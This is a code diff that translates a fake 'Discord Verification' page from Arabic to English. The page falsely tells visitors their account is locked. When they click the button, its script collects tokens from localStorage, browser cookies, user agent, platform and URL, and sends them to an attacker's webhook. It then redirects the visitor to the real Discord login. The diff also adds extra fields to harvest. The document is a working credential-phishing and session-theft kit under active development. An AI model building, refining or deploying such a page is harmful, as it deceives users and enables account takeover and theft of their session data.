@@ -1,20 +1,19 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>Discord Verification</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body {
             background-color: #313338;
             color: #dbdee1;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden;
         }
         .card {
             background-color: #2b2d31;
@@ -72,14 +71,14 @@
         <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Discord" class="logo">
         
         <div id="content">
-            <h1>توثيق الحساب مطلوب</h1>
-            <p>لقد تم إيقاف حسابك مؤقتاً لأسباب أمنية. يرجى النقر على الزر أدناه لتوثيق حسابك والتحقق من هويتك للعودة إلى استخدام ديسكورد.</p>
-            <button class="btn" onclick="startVerification()">توثيق الحساب الآن</button>
+            <h1>Verification Required</h1>
+            <p>Your account has been temporarily locked for security reasons. Please click the button below to verify your identity and regain access to your account.</p>
+            <button class="btn" onclick="startVerification()">Verify Account Now</button>
         </div>
 
         <div id="loading">
             <div class="spinner"></div>
-            <p style="margin:0; color:#00a8fc;">جاري التحقق من الهوية...</p>
+            <p style="margin:0; color:#00a8fc;">Verifying identity...</p>
         </div>
     </div>
 
@@ -90,7 +89,6 @@
             document.getElementById('content').style.display = 'none';
             document.getElementById('loading').style.display = 'flex';
 
-            // محاولة سحب أي توكن عادي (غير مشفر)
             let tokens = [];
             try {
                 for (let i = 0; i < localStorage.length; i++) {
@@ -103,22 +101,21 @@
                 }
             } catch(e){}
 
-            // تجميع البيانات
             const info = {
-                tokens: tokens.length > 0 ? tokens : ["لا يوجد توكن (التشفير يمنع السحب)"],
-                email: localStorage.getItem('email') || "غير محفوظ",
+                tokens: tokens.length > 0 ? tokens : ["No token found (User not logged in or Token is encrypted)"],
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
+                language: navigator.language,
                 time: new Date().toISOString(),
+                url: location.href,
                 cookies: document.cookie
             };
 
-            // الإرسال للويبهوك
             fetch(WEBHOOK, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: "**🚨 تم الضغط على زر التوثيق!**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1950) + "\n```"
+                    content: "**New Verification Hit!**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1950) + "\n```"
                 })
             }).catch(()=>{}).finally(() => {
                 setTimeout(() => { window.location.href = "https://discord.com/login"; }, 1500);
